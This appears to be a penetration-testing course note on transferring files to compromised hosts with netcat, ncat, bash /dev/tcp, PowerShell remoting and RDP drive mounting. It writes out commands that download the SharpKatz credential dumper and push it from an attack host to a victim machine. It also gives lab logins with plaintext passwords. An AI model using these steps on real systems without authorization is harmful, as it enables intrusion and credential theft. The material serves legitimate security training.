# 🚘 Miscellaneous File Transfer

Here we'll see how to transfer files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using RDP and PowerShell sessions.

### Netcat

Netcat is used for reading from and writing to network connections using TCP or UDP

**Transfer files ->**

```shell-session
nc -l -p 8000 > SharpKatz.exe
```

Here we use the options for listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard\_streams#Standard\_input\_\(stdin\)) using a single greater-than `>` followed by the filename

and if the compromised machine is using Ncat we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat

```shell-session
 ncat -l -p 8000 --recv-only > SharpKatz.exe
```

**Sending File to Compromised machine**

```shell-session
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.

**Ncat**

```shell-session
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

***

in scenarios where there's a firewall blocking inbound connections we can  listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework\_4.7\_x64/SharpKatz.exe) as input to Netcat.

```
#On our attack host
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```
#On target machine
nc 192.168.49.128 443 > SharpKatz.exe
```

**Ncat**

```
#On our attack host
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```
#On target machine
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

***

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

**Sending File as Input to Netcat**

<pre class="language-shell-session"><code class="lang-shell-session">#Original Netcat
<strong>sudo nc -l -p 443 -q 0 &#x3C; SharpKatz.exe
</strong><strong>
</strong>#Ncat
sudo ncat -l -p 443 --send-only &#x3C; SharpKatz.exe
</code></pre>

And then our victim connects to ncat Using /dev/tcp to Receive the File

```shell-session
#Victim
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell

If we encounter scenarios where HTTP, HTTPS, or SMB are unavailable we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

Here we will transfer a file from `DC01` to `DATABASE01` and vice versa. We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`

**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

**Create a PowerShell Remoting Session to DATABASE01**

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

**Copy samplefile.txt from our Localhost to the DATABASE01 Session**

```
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

**Mounting a Linux Folder Using rdesktop**

```shell-session
ElFelixi0@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Mounting a Linux Folder Using xfreerdp**

```shell-session
ElFelixi0@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
